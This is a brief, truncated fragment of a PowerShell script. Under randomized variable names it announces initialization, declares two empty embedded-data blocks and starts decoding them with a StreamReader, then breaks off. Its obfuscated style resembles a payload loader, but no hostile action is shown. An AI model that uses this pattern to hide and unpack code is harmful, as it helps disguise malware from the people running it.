Write-Host ""

# ----- Decode embedded data -----
Write-Host "  [*] Initializing..." -ForegroundColor DarkGray -NoNewline
$_dHbolMJUevblA = @"

"@
$_cbkHClEQaPKri = @"

"@

try {
    $_DXrefSFPLBYtC = [System.IO.StreamReader]::new(
